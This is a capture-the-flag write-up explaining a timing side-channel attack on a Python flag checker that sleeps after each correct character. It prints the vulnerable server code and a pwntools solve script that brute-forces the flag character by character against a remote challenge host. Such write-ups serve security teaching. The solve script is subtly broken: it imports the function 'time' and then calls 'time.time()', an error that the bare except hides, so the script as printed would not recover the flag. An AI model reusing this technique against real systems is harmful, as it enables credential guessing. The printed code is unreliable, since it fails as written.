# Time

Author: v10l3nt

## Description

Time may be a fleeting moment; but use this moment to capture the flag.

## Solution

This challenge is a simple demistration of a side channel timing attack. In the provided script it can be seen that the server will check each character individually and for each correct character it will wait 0.25 seconds before moving to the next character. It is possible to use this information to turn a exponential time brute force into a linear time brute force.

```python
#!/usr/bin/python3

import time

flag = open('flag.txt', 'r').readline().strip('\n').lower()
print("[+] Guess the flag >>> ")

user_guess = input().lower()

for i in range(0, len(flag)):
    if i+1 > len(user_guess):
        print("\n[!] Incorrect")
        exit(-1)
    elif (user_guess[i] != flag[i]):
        print("\n[!] Incorrect")
        exit(-1)
    else:
        time.sleep(0.25)

print("\n[+] Access Granted. Your Flag is: %s" %flag)
```

With each correct character, the time it takes for a response to be sent will increase by 0.25 seconds. The solve script below takes advantage of that to build the password one charater at a time based on the amount of time it takes before returning a response.

```python
#!/usr/bin/python3

from time import time
from pwn import *
import string

context.log_level = 'error'
alphabet = '{' + '_' + '}' + string.ascii_lowercase


def brute_char(flag):
    times = {}
    for char in alphabet:
        p = remote('0.cloud.chals.io', 27198)
        p.recvuntil(b'>>>')

        try:
            test = flag + char.encode()

            t1 = time.time()
            p.sendline(test)
            r = p.recvuntil(b'[')
            t2 = time.time()
            
            td = round(t2 - t1, 2)
            
            times[char] = td
            print(f"Tried: {test} Time Diff {td}.")
        except:
            print(f"Tried: {char} No Response.")

    return [(value, key) for key, value in times.items()]

def main():
    flag = b'uscg{not_this_time'

    while True:
        if b'}' in flag:
            break
        
        times = brute_char(flag)
        max_time = max(times)[1]

        flag += max_time.encode()
        print(f"Discovered Next Char: {flag}")

    print(f"Flag Found: {flag}")

main()
```

